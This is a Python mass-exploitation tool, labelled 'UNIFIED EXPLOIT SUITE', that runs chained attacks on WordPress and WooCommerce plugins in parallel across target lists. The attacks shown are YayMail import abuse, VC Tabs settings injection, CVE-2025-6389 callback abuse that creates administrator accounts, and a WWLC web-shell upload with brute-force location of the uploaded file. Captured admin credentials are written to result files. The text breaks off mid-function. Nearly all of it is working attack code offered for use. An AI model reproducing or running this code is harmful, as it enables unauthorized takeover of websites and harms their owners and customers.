#!/usr/bin/env python3
"""
UNIFIED EXPLOIT SUITE
=====================
Self-contained aggregation of 27 WordPress/e-commerce exploit scripts.

Merges logic from:
  - YayMail, VC Tabs, CVE-2025-6389, WWLC, Post-SMTP, WooCPay
  - Masteriyo, Magento, Nxzero, N_X, and 17 supporting scripts

Single entry point with unified config:
  - Target file (one per line)
  - Threads (concurrent workers)
  - Timeout (HTTP requests)

Execution: 28 sequential stages, each running all targets in parallel.
All result files are written independently per stage.

By: Ykzer (Refactored)
"""

import os
import sys
import re
import json
import time
import random
import threading
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Set
from urllib.parse import urlparse, parse_qs, urljoin
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any
import requests
import urllib3
import configparser


try:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

os.environ["NO_PROXY"] = "*"
requests.packages.urllib3.disable_warnings()

# ============================================================================
# GLOBAL CONFIGURATION
# ============================================================================

GLOBAL_CONFIG = {
    "targets_file": "list.txt",
    "threads": 10,
    "timeout": 30,
    "targets": [],
    "plugin_zip": "Nxploited.zip",
}

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(SCRIPT_DIR, "data")
os.makedirs(DATA_DIR, exist_ok=True)
RESULTS_DIR = os.path.join(SCRIPT_DIR, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

def _load_settings_ini():
    cfg = configparser.ConfigParser()
    ini_path = os.path.join(SCRIPT_DIR, "settings.ini")
    if os.path.isfile(ini_path):
        try:
            cfg.read(ini_path, encoding="utf-8")
        except Exception:
            cfg.read(ini_path)
        for section, keys in [
            ("files", ("plugin_zip", "shell_url")),
            ("credentials", ("email", "username_prefix", "password")),
        ]:
            if cfg.has_section(section):
                for key in keys:
                    if cfg.has_option(section, key):
                        val = cfg.get(section, key).strip()
                        if val:
                            GLOBAL_CONFIG[key] = val

_load_settings_ini()

def resolve_credential(key: str, fallback: str = "") -> str:
    """Return credential from settings.ini or generate random fallback."""
    val = GLOBAL_CONFIG.get(key, "").strip()
    if val:
        return val
    return fallback


STAGE_RESULTS = {}

# ============================================================================
# COMMON HELPERS
# ============================================================================

def log_info(stage: str, msg: str) -> None:
    """Log info message."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [*] {msg}")


def log_ok(stage: str, msg: str) -> None:
    """Log success message."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [+] {msg}")


def log_err(stage: str, msg: str) -> None:
    """Log error message."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] [!] {msg}")


def normalize_url(url: str) -> str:
    """Normalize and validate URL."""
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def get_random_ua() -> str:
    """Random user agent."""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15",
    ]
    return random.choice(agents)


def build_session(timeout: int = 10) -> requests.Session:
    """Build a requests session with retry logic."""
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": get_random_ua()})
    adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.timeout = timeout
    return s


def safe_write_result(filename: str, line: str) -> None:
    """Thread-safe result file writing."""
    try:
        with open(filename, "a", encoding="utf-8", errors="ignore") as f:
            f.write(line.rstrip() + "\n")
    except Exception:
        pass


def stage_result_file(stage_name: str, filename: str) -> str:
    """Return path: results/stage_name/filename. Creates folder automatically."""
    folder = os.path.join(RESULTS_DIR, stage_name.lower().replace(" ", "_").replace("-", "_"))
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, filename)


def stage_write(stage_name: str, filename: str, line: str) -> None:
    """Write a result line into results/stage_name/filename."""
    safe_write_result(stage_result_file(stage_name, filename), line)


def load_plugin_zip() -> Optional[bytes]:
    """Load Nxploited.zip from disk. Returns file bytes or None if not found."""
    zip_name = GLOBAL_CONFIG.get("plugin_zip", "Nxploited.zip")
    candidates = [
        os.path.join(DATA_DIR, zip_name),
        os.path.join(SCRIPT_DIR, zip_name),
        os.path.join(os.getcwd(), zip_name),
        zip_name,
    ]
    for path in candidates:
        if os.path.isfile(path):
            try:
                with open(path, "rb") as f:
                    return f.read()
            except Exception:
                continue
    return None


def load_targets(path: str) -> List[str]:
    """Load targets from file."""
    targets = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith("#"):
                    targets.append(normalize_url(url))
    except FileNotFoundError:
        log_err("LOAD", f"Targets file not found: {path}")
        return []
    return targets


def extract_nonce(html: str, pattern_name: str = "_wpnonce") -> Optional[str]:
    """Extract nonce from HTML."""
    if not html:
        return None
    
    patterns = [
        rf'name=["\']_{pattern_name}["\'][^>]*value=["\']([^"\']+)["\']',
        rf'{pattern_name}["\']?\s*:\s*["\']([^"\']+)["\']',
        rf'["\']{pattern_name}["\'][^}}]*["\']([^"\']+)["\']',
    ]
    
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def _build_minimal_zip(filename: str, content: bytes) -> bytes:
    """Build a minimal valid ZIP file containing one file."""
    import zipfile as _zf
    import io as _io
    buf = _io.BytesIO()
    with _zf.ZipFile(buf, 'w', _zf.ZIP_DEFLATED) as z:
        z.writestr(filename, content)
    return buf.getvalue()


# ============================================================================
# STAGE 1: YAYMAIL (CVE-2026-1937)
# ============================================================================

def run_yaymail(targets: List[str], threads: int, timeout: int) -> Dict:
    """YayMail — 100% match CVE-2026-1937.py: WooCommerce reg + WP/Woo login + admin verify + YayMail import."""
    stage_name = "YayMail"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    reg_file = "reg.txt"
    admin_file = "Nx_admin.txt"
    log_info(stage_name, f"Starting YayMail original chain ({len(targets)} targets)")

    def _fetch_woo_pages(session, base):
        root = base.rstrip("/")
        htmls = {}
        for p in ["/my-account/", "/my_account/", "/My-account/", "/account/", "/myaccount/",
                  "/customer-login/", "/login/", "/register/", "/sss/"]:
            try:
                r = session.get(root + p, timeout=timeout, verify=False, headers={"User-Agent": get_random_ua()})
                if r.status_code == 200 and "<form" in r.text.lower():
                    htmls[root + p] = r.text
            except Exception:
                continue
        return htmls

    def _extract_register_form(html):
        if "woocommerce-register-nonce" not in html and "register" not in html.lower():
            return None
        nm = re.search(r'name=["\']woocommerce-register-nonce["\']\s+value=["\']([^"\']+)["\']', html, re.I)
        if not nm:
            return None
        nonce = nm.group(1)
        fm = re.search(r'<form[^>]+method=["\']post["\'][^>]*action=["\']([^"\']*)["\'][^>]*>', html, re.I)
        action = fm.group(1) if fm else ""
        email_nm = "email"
        pass_nm = "password"
        user_nm = None
        em = re.search(r'<input[^>]+type=["\']email["\'][^>]*name=["\']([^"\']+)["\']', html, re.I)
        if em: email_nm = em.group(1)
        pm = re.search(r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']', html, re.I)
        if pm: pass_nm = pm.group(1)
        um = re.search(r'<input[^>]+(name=["\']username["\']|id=["\']username["\'])[^>]*>', html, re.I)
        if um:
            mn = re.search(r'name=["\']([^"\']+)["\']', um.group(0), re.I)
            if mn: user_nm = mn.group(1)
        return {"action": action, "nonce": nonce, "email_name": email_nm, "pass_name": pass_nm, "user_name": user_nm}

    def _extract_login_form(html):
        if "woocommerce-login-nonce" not in html and "login" not in html.lower():
            return None
        nm = re.search(r'name=["\']woocommerce-login-nonce["\']\s+value=["\']([^"\']+)["\']', html, re.I)
        if not nm:
            return None
        nonce = nm.group(1)
        fm = re.search(r'<form[^>]+method=["\']post["\'][^>]*action=["\']([^"\']*)["\'][^>]*>', html, re.I)
        action = fm.group(1) if fm else ""
        user_name = "username"
        password_name = "password"
        u_input = re.search(r'<input[^>]+(name=["\']username["\']|id=["\']username["\'])[^>]*>', html, re.I)
        if u_input:
            mn = re.search(r'name=["\']([^"\']+)["\']', u_input.group(0), re.I)
            if mn: user_name = mn.group(1)
        pass_input = re.search(r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']', html, re.I)
        if pass_input: password_name = pass_input.group(1)
        return {"action": action, "login_nonce": nonce, "username_name": user_name, "password_name": password_name}

    def _woo_register(session, base, username, email, password):
        pages = _fetch_woo_pages(session, base)
        if not pages: return None
        for url, html in pages.items():
            reg = _extract_register_form(html)
            if not reg: continue
            target_action = reg["action"] or url
            post_url = target_action if target_action.startswith("http") else urljoin(base.rstrip("/") + "/", target_action.lstrip("/"))
            data = {reg["email_name"]: email, reg["pass_name"]: password,
                    "woocommerce-register-nonce": reg["nonce"], "_wp_http_referer": urlparse(url).path,
                    "register": "Register"}
            if reg["user_name"]: data[reg["user_name"]] = username
            headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded", "Referer": url}
            try:
                r = session.post(post_url, data=data, headers=headers, timeout=timeout, verify=False)
                if r.status_code in (302, 303): return {"username": username, "email": email, "password": password}
                if any(x in r.text.lower() for x in ["wc-ajax=get_refreshed_fragments", "logout", "my account", "account details"]):
                    return {"username": username, "email": email, "password": password}
            except Exception:
                continue
        return None

    def _wp_login(session, base, username, password):
        login_url = base.rstrip("/") + "/wp-login.php"
        try:
            session.get(login_url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
        except Exception:
            pass
        data = {"log": username, "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded",
                   "Referer": login_url, "Cookie": "wordpress_test_cookie=WP Cookie check"}
        try:
            r = session.post(login_url, data=data, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
            if "wordpress_logged_in" in r.headers.get("Set-Cookie", ""): return True
            if any(c.name.startswith("wordpress_logged_in") for c in session.cookies): return True
            if "/wp-admin/" in r.url or "dashboard" in r.text.lower(): return True
        except Exception:
            pass
        return False

    def _woo_login(session, base, username_or_email, password):
        pages = _fetch_woo_pages(session, base)
        if not pages: return False
        for url, html in pages.items():
            login = _extract_login_form(html)
            if not login: continue
            target_action = login["action"] or url
            post_url = target_action if target_action.startswith("http") else urljoin(base.rstrip("/") + "/", target_action.lstrip("/"))
            data = {login["username_name"]: username_or_email, login["password_name"]: password,
                    "woocommerce-login-nonce": login["login_nonce"], "_wp_http_referer": urlparse(url).path,
                    "login": "Log in"}
            headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded", "Referer": url}
            try:
                r = session.post(post_url, data=data, headers=headers, timeout=timeout, verify=False)
                if r.status_code in (302, 303): return True
                if any(x in r.text.lower() for x in ["wc-ajax=get_refreshed_fragments", "logout", "my account", "account details"]):
                    return True
            except Exception:
                continue
        return False

    def _verify_admin(session, base):
        for au in [base.rstrip("/") + p for p in ["/wp-admin/", "/wp-admin/index.php", "/wp-admin/users.php", "/wp-admin/plugins.php"]]:
            try:
                r = session.get(au, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False, allow_redirects=False)
                if r.status_code in (301, 302) and "wp-login.php" in r.headers.get("Location", ""):
                    continue
                if r.status_code == 200:
                    lt = r.text.lower()
                    if any(i in lt for i in ["wp-admin-bar", "adminmenu", "manage_options", "users.php", "plugins.php"]):
                        return True
            except Exception:
                continue
        return False

    def _yaymail_chain(session, base):
        url = base.rstrip("/") + "/wp-admin/admin.php?page=yaymail-settings#/email-templates"
        try:
            r = session.get(url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
            if r.status_code != 200: return False
        except Exception:
            return False
        m = re.search(r'\{"url"\s*:\s*"([^"]*admin-ajax\.php[^"]*)"\s*,\s*"nonce"\s*:\s*"([0-9a-zA-Z]{4,64})"', r.text, re.I)
        if not m:
            m = re.search(r'"url"\s*:\s*"([^"]*admin-ajax\.php[^"]*)".{0,300}?"nonce"\s*:\s*"([0-9a-zA-Z]{4,64})"', r.text, re.I | re.DOTALL)
        if not m: return False
        ajax_url = m.group(1).replace(r"\/", "/")
        nonce = m.group(2)
        def _yaymail_json_zip():
            import json as _js
            data = {"version":"1.0","created_date":"2026-02-17 00:00:00","posts":[{"ID":1}],
                    "postmeta":[{"meta_id":1,"post_id":1,"meta_key":"_dummy","meta_value":"1"}],
                    "options":[{"option_name":"default_role","option_value":"administrator"},
                              {"option_name":"users_can_register","option_value":"1"}]}
            return _build_minimal_zip("export.json", _js.dumps(data).encode("utf-8"))

        zip_path = os.path.join(DATA_DIR, "yaymail_backup.zip")
        if os.path.isfile(zip_path):
            try:
                with open(zip_path, "rb") as f:
                    zip_data = f.read()
            except Exception:
                zip_data = _yaymail_json_zip()
        else:
            zip_data = _yaymail_json_zip()
        files = {"import_file": ("yaymail_backup.zip", zip_data, "application/zip")}
        try:
            rr = session.post(ajax_url if ajax_url.startswith("http") else urljoin(base.rstrip("/") + "/", ajax_url.lstrip("/")),
                             headers={"User-Agent": get_random_ua()}, data={"action": "yaymail_import_state", "nonce": nonce},
                             files=files, timeout=timeout, verify=False)
            try:
                j = rr.json()
                if j.get("success") is True and "import state successfully" in str(j.get("data", {}).get("message", "")).lower():
                    return True
            except Exception:
                pass
            if rr.status_code == 200 and "import state successfully" in rr.text.lower():
                return True
        except Exception:
            pass
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            session = build_session(timeout)
            prefix = resolve_credential("username_prefix", "Ykzer")
            email_cfg = resolve_credential("email", "")
            if email_cfg:
                email = email_cfg
                username = prefix + "_" + email.split("@")[0] if "@" in email else prefix + "_" + str(random.randint(1000, 9999))
            else:
                username = prefix + "_" + str(random.randint(1000, 9999))
                email = username + "@test.com"
            password = resolve_credential("password", prefix + "@123")

            reg_info = _woo_register(session, base, username, email, password)
            if not reg_info: return False

            ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
            stage_write(stage_name, "reg.txt", f"[{ts}] {base} user:{reg_info['username']} email:{reg_info['email']} pass:{reg_info['password']}")

            logged = _wp_login(session, base, reg_info["username"], reg_info["password"])
            if not logged:
                logged = _woo_login(session, base, reg_info["email"], reg_info["password"])
            if not logged: return False

            if _verify_admin(session, base):
                stage_write(stage_name, "Nx_admin.txt", f"[{ts}] {base} user:{reg_info['username']} pass:{reg_info['password']} | already admin")
                safe_write_result("login.txt", f"{base} | {reg_info['username']} | {reg_info['password']} | {reg_info['email']} | {base}/wp-login.php")
                safe_write_result("vulnurls.txt", base)
                return True

            if _yaymail_chain(session, base):
                if _verify_admin(session, base):
                    stage_write(stage_name, "Nx_admin.txt", f"[{ts}] {base} user:{reg_info['username']} pass:{reg_info['password']} | yaymail import")
                else:
                    stage_write(stage_name, "Nx_admin.txt", f"[{ts}] {base} user:{reg_info['username']} pass:{reg_info['password']} | yaymail import (no admin)")
                safe_write_result("login.txt", f"{base} | {reg_info['username']} | {reg_info['password']} | {reg_info['email']} | {base}/wp-login.php")
                safe_write_result("vulnurls.txt", base)
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 2: VC TABS (vc-tabs.py)
# ============================================================================

def run_vc_tabs(targets: List[str], threads: int, timeout: int) -> Dict:
    """VC Tabs — exact match vc-tabs.py: OXI settings dual exploit + register flow verification."""
    stage_name = "VC-Tabs"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    admin_file = "Nx_New_admin.txt"
    mail_file = "admin_mail.txt"
    email = resolve_credential("email", "sp0k4club@gmail.com")
    log_info(stage_name, f"Starting VC Tabs original chain ({len(targets)} targets)")

    REGISTER_FORM_RE = re.compile(r'<form[^>]+wp-login\.php\?action=register[^>]*>', re.I)
    EMAIL_FIELD_RE = re.compile(r'name=["\']user_email["\']', re.I)
    NONCE_RE = re.compile(r'name=["\']_wpnonce["\']\s+value=["\']([^"\']+)["\']', re.I)

    def _is_success(text):
        return ('<span class="oxi-confirmation-success"' in text or "oxi-confirmation-success" in text)

    def _send_oxi(site, name, value):
        base = normalize_url(site)
        headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": get_random_ua()}
        try:
            r = requests.post(f"{base}/wp-json/oxilabtabsultimate/v1/oxi_settings/",
                            data=f'rawdata={{"name":"{name}","value":"{value}"}}',
                            headers=headers, timeout=timeout, verify=False)
            return _is_success(r.text or "")
        except Exception:
            return False

    def _has_register_flow(site):
        url = f"{normalize_url(site)}/wp-login.php?action=register"
        try:
            r = requests.get(url, headers={"User-Agent": get_random_ua()}, timeout=timeout, verify=False)
            if r.status_code != 200: return False
            html = r.text or ""
            if not REGISTER_FORM_RE.search(html): return False
            if not EMAIL_FIELD_RE.search(html): return False
            if not NONCE_RE.search(html): return False
            return True
        except Exception:
            return False

    def exploit_target(target: str) -> bool:
        try:
            site = target.strip()
            if not site: return False
            ok_a = _send_oxi(site, "users_can_register", "1")
            ok_b = _send_oxi(site, "default_role", "administrator")
            if ok_a and ok_b:
                reg_url = f"{normalize_url(site)}/wp-login.php?action=register"
                stage_write(stage_name, "Nx_New_admin.txt", reg_url)
                safe_write_result("vulnurls.txt", normalize_url(site))
                if _has_register_flow(site):
                    stage_write(stage_name, "admin_mail.txt", f"{reg_url} | email={email}")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1
    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 3: CVE-2025-6389 (Sneeit Pagination)
# ============================================================================

def run_cve_2025_6389(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2025-6389 — 100% match: var_dump test -> wp_insert_user admin creation."""
    stage_name = "CVE-2025-6389"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}

    log_info(stage_name, f"Starting CVE-2025-6389 ({len(targets)} targets)")

    def is_vulnerable(resp_text: str) -> bool:
        if not resp_text:
            return False
        return ("array(1)" in resp_text) and ("[0]" in resp_text) and ('"test"' in resp_text)

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False

            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            headers = {"User-Agent": get_random_ua()}
            test_payload = [
                ("action", "sneeit_articles_pagination"),
                ("callback", "var_dump"),
                ("args", '["test"]'),
            ]

            test_resp = requests.post(ajax_url, headers=headers, data=test_payload,
                                     timeout=timeout, verify=False, allow_redirects=True)
            if not is_vulnerable(test_resp.text):
                return False

            username = f"Ykzer_{random.randint(1000, 9999)}"
            email = f"{username}@test.com"
            password = "Ykzer@123"

            exploit_payload = [
                ("action", "sneeit_articles_pagination"),
                ("callback", "wp_insert_user"),
                ("args", f'{{"user_login":"{username}","user_pass":"{password}",'
                        f'"user_email":"{email}","role":"administrator"}}'),
            ]

            exploit_resp = requests.post(ajax_url, headers=headers, data=exploit_payload,
                         timeout=timeout, verify=False, allow_redirects=True)

            # Original format: {target} | USER: {user} | PASS: {pass} | EMAIL: {email}
            stage_write(stage_name, "success_results.txt",
                       f"{base} | USER: {username} | PASS: {password} | EMAIL: {email}")
            safe_write_result("vulnurls.txt", base)
            if exploit_resp.status_code == 200:
                safe_write_result("login.txt", f"{base} | {username} | {password} | {email} | {base}/wp-login.php")
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 4: WWLC (CVE-2026-2754-CVE-2026-27540)
# ============================================================================

def run_wwlc(targets: List[str], threads: int, timeout: int) -> Dict:
    """WWLC: 100% match original script — Mode1 (file upload + temp folder brute-force)
    and/or Mode2 (registration + role injection + strict admin verification)."""
    stage_name = "WWLC"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}

    cfg = configparser.ConfigParser()
    ini_path = os.path.join(SCRIPT_DIR, "settings.ini")
    mode = "both"
    if os.path.isfile(ini_path):
        try:
            cfg.read(ini_path, encoding="utf-8")
        except Exception:
            cfg.read(ini_path)
        if cfg.has_section("wwlc") and cfg.has_option("wwlc", "mode"):
            mode = cfg.get("wwlc", "mode").strip().lower()
    if mode not in ("1", "2", "both"):
        mode = "both"

    log_info(stage_name, f"Starting WWLC full chain ({len(targets)} targets, mode={mode})")

    shell_path = os.path.join(DATA_DIR, "shell.php")
    shell_mode1_available = os.path.isfile(shell_path)
    shell_signature = "Nx_SHELL_SIGNATURE"
    if mode in ("1", "both") and not shell_mode1_available:
        log_err(stage_name, f"shell.php not found at {shell_path}, skipping Mode1")
        if mode == "1":
            mode = "none"
        else:
            mode = "2"

    username_prefix = resolve_credential("username_prefix", "Ykzer")
    email_cfg = resolve_credential("email", "")
    password = resolve_credential("password", "Ykzer@123")

    # ------------------------------------------------------------------
    # MODE 1: file upload + wwlc-temp-* folder brute-force
    # ------------------------------------------------------------------

    def _guess_uploads_base(base_url: str) -> str:
        return base_url.rstrip("/") + "/wp-content/uploads"

    def _try_list_uploads(sess: requests.Session, uploads_base: str) -> List[str]:
        candidates: List[str] = []
        url = uploads_base.rstrip("/") + "/"
        try:
            r = sess.get(url, timeout=timeout, allow_redirects=True, verify=False)
        except Exception:
            return candidates
        if r.status_code not in (200, 403):
            return candidates
        body = r.text or ""
        lower = body.lower()
        if "index of" in lower and "wp-content/uploads" in lower:
            for m in re.finditer(r'href=["\'](wwlc-temp-[^/"\' ]+/?)["\']', body, re.I):
                candidates.append(m.group(1).rstrip("/"))
        return list(dict.fromkeys(candidates))

    def _random_hex(n: int) -> str:
        return "".join(random.choice("0123456789abcdef") for _ in range(n))

    def _generate_pattern_guesses(max_guesses: int) -> List[str]:
        guesses: List[str] = []
        now = time.localtime()
        ymd = time.strftime("%Y%m%d", now)
        ymdh = time.strftime("%Y%m%d%H", now)
        ymdhm = time.strftime("%Y%m%d%H%M", now)
        for tp in [f"wwlc-temp-{ymd}", f"wwlc-temp-{ymdh}", f"wwlc-temp-{ymdhm}"]:
            guesses.append(tp)
        hex_targets = max(10, max_guesses // 4)
        for _ in range(hex_targets):
            for ln in (12, 13, 16):
                if len(guesses) >= max_guesses:
                    break
                guesses.append("wwlc-temp-" + _random_hex(ln))
            if len(guesses) >= max_guesses:
                break
        seq_limit = min(10000, max_guesses - len(guesses))
        for i in range(1, seq_limit + 1):
            guesses.append(f"wwlc-temp-{i:010d}")
            if len(guesses) >= max_guesses:
                break
        return list(dict.fromkeys(guesses))

    def _generate_random_hex_guesses(count: int) -> List[str]:
        return ["wwlc-temp-" + _random_hex(13) for _ in range(count)]

    def _try_shell_at(sess: requests.Session, url: str, sig: str) -> bool:
        try:
            r = sess.get(url, timeout=timeout, allow_redirects=True, verify=False)
        except Exception:
            return False
        if r.status_code != 200:
            return False
        return sig in (r.text or "")

    def _upload_shell(sess: requests.Session, base_url: str, sh_path: str) -> Tuple[bool, Optional[str]]:
        ajax_url = base_url.rstrip("/") + "/wp-admin/admin-ajax.php"
        if not os.path.isfile(sh_path):
            log_err(stage_name, f"{base_url} | shell file not found: {sh_path}")
            return False, None
        files = {
            "uploaded_file": (os.path.basename(sh_path), open(sh_path, "rb"), "application/octet-stream")
        }
        data = {
            "action": "wwlc_file_upload_handler",
            "file_settings": json.dumps({
                "allowed_file_types": ["php", "jpg"],
                "max_allowed_file_size": 99999999
            })
        }
        try:
            r = sess.post(ajax_url, data=data, files=files, timeout=timeout, verify=False)
        except Exception as e:
            log_err(stage_name, f"{base_url} | upload error: {e}")
            return False, None
        text = r.text or ""
        try:
            j = json.loads(text)
        except Exception:
            log_err(stage_name, f"{base_url} | upload non-JSON: {text[:150]!r}")
            return False, None
        if not isinstance(j, dict):
            log_err(stage_name, f"{base_url} | upload JSON not object: {text[:150]!r}")
            return False, None
        status_val = str(j.get("status", "")).lower()
        if status_val != "success":
            log_err(stage_name, f"{base_url} | upload failed: {j}")
            return False, None
        file_name = j.get("file_name")
        if not file_name:
            log_err(stage_name, f"{base_url} | upload success but no file_name")
            return False, None
        log_ok(stage_name, f"{base_url} | upload success file_name={file_name}")
        return True, file_name

    def _try_locate_shell(sess: requests.Session, base_url: str, file_name: str,
                          sig: str, max_pattern: int, max_random: int) -> Optional[str]:
        uploads_base = _guess_uploads_base(base_url)
        dl_folders = _try_list_uploads(sess, uploads_base)
        if dl_folders:
            log_info(stage_name, f"{base_url} | directory listing: {len(dl_folders)} candidates")
            for folder in dl_folders:
                url = f"{uploads_base.rstrip('/')}/{folder}/{file_name}"
                if _try_shell_at(sess, url, sig):
                    log_ok(stage_name, f"{base_url} | shell FOUND via listing: {url}")
                    return url
        pattern_guesses = _generate_pattern_guesses(max_pattern)
        total_patterns = len(pattern_guesses)
        log_info(stage_name, f"{base_url} | pattern brute-force ({total_patterns} guesses)")
        for idx, g in enumerate(pattern_guesses, start=1):
            url = f"{uploads_base.rstrip('/')}/{g}/{file_name}"
            if _try_shell_at(sess, url, sig):
                log_ok(stage_name, f"{base_url} | shell FOUND via pattern: {url}")
                return url
            if idx % 200 == 0:
                log_info(stage_name, f"{base_url} | pattern: {idx}/{total_patterns}")
        if max_random > 0:
            random_guesses = _generate_random_hex_guesses(max_random)
            log_info(stage_name, f"{base_url} | random hex brute-force ({max_random} guesses)")
            for idx, g in enumerate(random_guesses, start=1):
                url = f"{uploads_base.rstrip('/')}/{g}/{file_name}"
                if _try_shell_at(sess, url, sig):
                    log_ok(stage_name, f"{base_url} | shell FOUND via random hex: {url}")
                    return url
                if idx % 500 == 0:
                    log_info(stage_name, f"{base_url} | random: {idx}/{max_random}")
        return None

    def _process_mode1(url: str) -> bool:
        base = normalize_url(url)
        if not base:
            return False
        sess = build_session(timeout)
        ok, fname = _upload_shell(sess, base, shell_path)
        if not ok or not fname:
            return False
        stage_write(stage_name, "wwlc_uploads.txt", f"{base} upload_success file_name={fname}")
        found_url = _try_locate_shell(sess, base, fname, shell_signature, 5000, 10000)
        if found_url:
            stage_write(stage_name, "wwlc_shells_found.txt", f"{base} shell_url={found_url}")
            return True
        else:
            log_err(stage_name, f"{base} | shell uploaded but temp folder NOT found (pattern=5000, random=10000)")
            return False

    # ------------------------------------------------------------------
    # MODE 2: registration + role injection + strict admin verification
    # ------------------------------------------------------------------

    WWLC_FORM_PATHS = [
        "/",
        "/register/",
        "/registration/",
        "/signup/",
        "/sign-up/",
        "/account/",
        "/my-account/",
        "/my-account/register/",
        "/my-account/registration/",
        "/user/register/",
        "/user/registration/",
        "/wholesale-register/",
        "/wholesale-registration/",
        "/wholesale-signup/",
        "/wholesale-lead/",
        "/wwlc-register/",
        "/wwlc-registration/",
        "/wholesale-account/",
        "/customer-register/",
        "/customer-registration/",
    ]

    def _has_logged_in_cookie(sess: requests.Session) -> bool:
        return any(c.name.startswith("wordpress_logged_in") for c in sess.cookies)

    def _find_wp_login_path(sess: requests.Session, base_url: str) -> str:
        paths = [
            "/wp-login.php",
            "/wordpress/wp-login.php",
            "/wp/wp-login.php",
            "/blog/wp-login.php",
            "/cms/wp-login.php",
            "/wp/login.php",
        ]
        for p in paths:
            url = base_url.rstrip("/") + p
            try:
                r = sess.get(url, timeout=timeout, allow_redirects=True, verify=False)
            except Exception:
                continue
            txt = r.text or ""
            if r.status_code == 200 and "<form" in txt and "password" in txt.lower():
                return p
        return "/wp-login.php"

    def _check_admin_access(sess: requests.Session, root_url: str) -> bool:
        admin_paths = [
            "/wp-admin/index.php",
            "/wp-admin/profile.php",
            "/wp-admin/edit.php",
            "/wp-admin/plugins.php",
            "/wp-admin/users.php",
        ]
        markers = [
            'id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">',
            'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"',
            "users.php", "plugins.php", "edit.php",
        ]
        deny = [
            "sorry, you are not allowed to access this page",
            "you do not have sufficient permissions",
            "insufficient permissions",
        ]
        ok_pages = 0
        for ep in admin_paths:
            u = root_url.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True, verify=False)
            except Exception:
                continue
            if r.status_code != 200:
                continue
            if "wp-login.php" in (r.url or ""):
                return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny):
                return False
            found = sum(1 for m in markers if m in content)
            if found >= 3:
                ok_pages += 1
            if ok_pages >= 2:
                return True
        try:
            r2 = sess.get(root_url.rstrip("/") + "/wp-admin/plugin-install.php",
                          timeout=timeout, allow_redirects=True, verify=False)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny):
                    return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2:
                    return True
        except Exception:
            pass
        return ok_pages >= 1

    def _strict_login_attempt(sess: requests.Session, base_url: str,
                                login_user: str, pwd: str) -> bool:
